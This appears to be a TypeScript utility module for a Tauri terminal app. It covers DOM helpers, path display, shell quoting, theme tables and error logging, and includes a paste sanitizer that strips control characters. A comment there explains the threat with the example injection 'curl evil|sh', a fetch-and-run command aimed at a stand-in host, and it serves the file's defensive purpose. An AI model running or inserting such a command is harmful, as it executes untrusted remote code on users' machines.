// Shared leaf utilities: DOM helpers, tab identity, string/path formatting, the
// in-pane toast, skin/theme tables, and the on-disk error log. No dependencies on
// the other split-out modules (only the observable store + reactdock's
// active-group lookup), so everything can import from here without cycles.
import { store, type FsEntry, type Skin } from "./state";
import { activeGroupEl } from "./reactdock";
import { invoke } from "@tauri-apps/api/core";

export const $ = <T extends HTMLElement>(s: string) => document.querySelector(s) as T;

export const sessionId = (name: string) => `s:${name}`;
export const activeId = () => store.get().active;
export const setActive = (id: string | null) => store.set({ active: id });

export const baseName = (p: string) => p.split("/").filter(Boolean).pop() ?? p;
export const tmuxName = (s: string) => s.replace(/[.:\s]/g, "-");

// "/Users/me/projects/x" -> "~/projects/x" for compact display. Home is filled
// once at boot (see init) so this stays synchronous for render.
let homeDirCached = "";
export function setHomeDir(h: string) {
  homeDirCached = h;
}
export function getHomeDir(): string {
  return homeDirCached;
}
export function tildify(p: string): string {
  const h = homeDirCached.replace(/\/$/, "");
  return h && p.startsWith(h + "/") ? "~" + p.slice(h.length) : p;
}

export const escapeHtml = (s: string) =>
  s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// Single-quote a token for /bin/sh so the clicked text can't inject shell.
export const shQuote = (s: string) => `'${s.replace(/'/g, `'\\''`)}'`;

export function pathArg(p: string): string {
  return /\s/.test(p) ? `'${p.replace(/'/g, "'\\''")}'` : p;
}

export const relTime = (ts: number): string => {
  if (!ts) return "";
  const m = Math.floor((Date.now() - ts) / 60000);
  if (m < 1) return "just now";
  if (m < 60) return `${m}m ago`;
  const h = Math.floor(m / 60);
  return h < 24 ? `${h}h ago` : `${Math.floor(h / 24)}d ago`;
};

export function fmtTime(ts: number): string {
  const d = new Date(ts);
  const p = (n: number) => String(n).padStart(2, "0");
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
}

// Strip C0 control chars + DEL (newlines, carriage returns, ESC) from text
// before it lands in a pty at the prompt. Activity rows (text/url/title arrive
// unauthenticated over the ingest server) flow through here on double-click; an
// embedded "\ncurl evil|sh\n" would otherwise auto-run on one click, and raw
// ESC could inject terminal escape sequences. Legit payloads (file paths,
// selections) carry no control chars, so this is a no-op for them.
export function sanitizePaste(data: string): string {
  // eslint-disable-next-line no-control-regex
  return data.replace(/[\x00-\x1f\x7f]+/g, " ");
}

// Transient in-pane toast for one-shot feedback (favorite saved, nothing to
// favorite, …). Mounts top-center INSIDE the active tab's group (not a global
// fixed corner) and slides in; reuses one node, re-parented to whichever pane is
// active so it always shows over the tab the gesture came from.
let toastEl: HTMLElement | null = null;
let toastTimer: number | null = null;
export function flashStatus(msg: string) {
  if (!toastEl) {
    toastEl = document.createElement("div");
    toastEl.className = "app-toast";
  }
  const host = activeGroupEl() ?? document.getElementById("dock") ?? document.body;
  if (toastEl.parentElement !== host) host.appendChild(toastEl);
  toastEl.textContent = msg;
  // restart the enter animation even if the node is reused mid-show
  toastEl.classList.remove("on");
  void toastEl.offsetWidth;
  toastEl.classList.add("on");
  if (toastTimer !== null) clearTimeout(toastTimer);
  toastTimer = window.setTimeout(() => toastEl?.classList.remove("on"), 1800);
}

// ---- files: glyphs + language table shared by the tree and previews ----
export const IMAGE_EXTS = new Set([
  "png", "jpg", "jpeg", "gif", "webp", "bmp", "svg", "ico", "avif",
]);

// Glyph for a filesystem row in the unified tree (folder / image / file).
export function fileGlyph(e: FsEntry): string {
  if (e.is_dir) return "📁";
  if (IMAGE_EXTS.has(e.ext)) return "🖼";
  return "📄";
}

// File extension -> shiki language id. Anything not listed falls back to plain
// text (shiki still renders it, just unhighlighted).
export const MD_EXTS = new Set(["md", "markdown", "mdx"]);
export const SHIKI_LANG: Record<string, string> = {
  ts: "typescript", tsx: "tsx", mts: "typescript", cts: "typescript",
  js: "javascript", jsx: "jsx", mjs: "javascript", cjs: "javascript",
  json: "json", jsonc: "json", css: "css", scss: "scss", less: "less",
  html: "html", xml: "xml", svg: "xml", vue: "vue", svelte: "svelte",
  rs: "rust", py: "python", rb: "ruby", go: "go", php: "php", java: "java",
  kt: "kotlin", swift: "swift", c: "c", h: "c", cpp: "cpp", hpp: "cpp",
  cc: "cpp", cs: "csharp", sh: "bash", bash: "bash", zsh: "bash",
  yml: "yaml", yaml: "yaml", toml: "toml", sql: "sql", lua: "lua",
  dockerfile: "docker", makefile: "makefile",
};

// ---- skin + terminal font tables ----
// xterm palettes per skin. XP = classic console; P5 = blood-red on black;
// AC3 = phosphor-green garage readout with an orange cursor.
export const THEMES: Record<Skin, { background: string; foreground: string; cursor: string }> = {
  xp: { background: "#000000", foreground: "#c0c0c0", cursor: "#ffffff" },
  p5: { background: "#0a0000", foreground: "#ff2b2b", cursor: "#ff2b2b" },
  ac3: { background: "#050805", foreground: "#b8e08a", cursor: "#ff8c1a" },
};

// Skin cycle order for the toolbar toggle (XP -> P5 -> AC3 -> XP).
export const SKIN_CYCLE: Skin[] = ["xp", "p5", "ac3"];
export const nextSkin = (s: Skin): Skin =>
  SKIN_CYCLE[(SKIN_CYCLE.indexOf(s) + 1) % SKIN_CYCLE.length];

// Terminal font chains. Default is Menlo + powerline/Nerd fallbacks (see the
// Terminal ctor for why). "Super XP" swaps in a pixel font, but MS Sans Serif is
// PROPORTIONAL and would shear the terminal grid, so we use Perfect DOS VGA 437
// (a pixel MONOSPACE) instead. That family ships with xp.css (already imported in
// main.ts:1) and is declared @font-face there, so no new font file is needed.
// Menlo stays as the fallback so missing glyphs still render monospaced.
export const TERM_FONT_FAMILY_DEFAULT =
  'Menlo, "Hack Nerd Font Mono", "MesloLGS NF", "DejaVu Sans Mono for Powerline", monospace';
export const TERM_FONT_FAMILY_PIXEL = '"Perfect DOS VGA 437 Win", Menlo, monospace';
export const termFontFamily = (): string =>
  store.get().xpPixel ? TERM_FONT_FAMILY_PIXEL : TERM_FONT_FAMILY_DEFAULT;

// Append a line to the on-disk log (app_data_dir/instant.log). The webview
// console isn't reachable once the app is bundled, so this is the durable record.
// Best-effort and fire-and-forget; never throws back into a caller.
export function logLine(line: string): void {
  let stamp = "";
  try {
    stamp = new Date().toISOString();
  } catch {
    /* ignore */
  }
  invoke("log_append", { line: `${stamp} ${line}` }).catch(() => {});
}

// Surface any boot/runtime error as a visible banner — the webview console
// isn't reachable from the terminal, so this is how errors get seen.
// Dismissable (× button or Escape); every occurrence still lands in the
// on-disk log via logLine regardless of whether the banner is up.
function onBannerEscape(e: KeyboardEvent) {
  if (e.key === "Escape") hideError();
}

export function hideError() {
  document.getElementById("boot-error")?.remove();
  window.removeEventListener("keydown", onBannerEscape, true);
}

export function showError(label: string, err: unknown) {
  const msg = err instanceof Error ? `${err.message}\n${err.stack ?? ""}` : String(err);
  logLine(`[${label}] ${msg}`);
  let el = document.getElementById("boot-error");
  if (!el) {
    el = document.createElement("div");
    el.id = "boot-error";
    el.style.cssText =
      "position:fixed;left:8px;right:8px;bottom:8px;z-index:99999;max-height:40%;display:flex;gap:8px;padding:8px;background:#a00;color:#fff;font:11px/1.4 Menlo,monospace;border:2px solid #fff;";
    const pre = document.createElement("pre");
    pre.style.cssText = "flex:1;margin:0;overflow:auto;white-space:pre-wrap;font:inherit;";
    const close = document.createElement("button");
    close.textContent = "×";
    close.title = "dismiss (Esc)";
    close.style.cssText =
      "align-self:flex-start;background:none;border:1px solid #fff;color:#fff;font:inherit;cursor:pointer;padding:0 6px;";
    close.addEventListener("click", hideError);
    el.append(pre, close);
    document.body.appendChild(el);
    // Capture phase so Escape dismisses even when focus sits in a terminal or
    // form field whose own handler stops propagation.
    window.addEventListener("keydown", onBannerEscape, true);
  }
  el.querySelector("pre")!.textContent = `[${label}] ${msg}`;
  console.error(label, err);
}
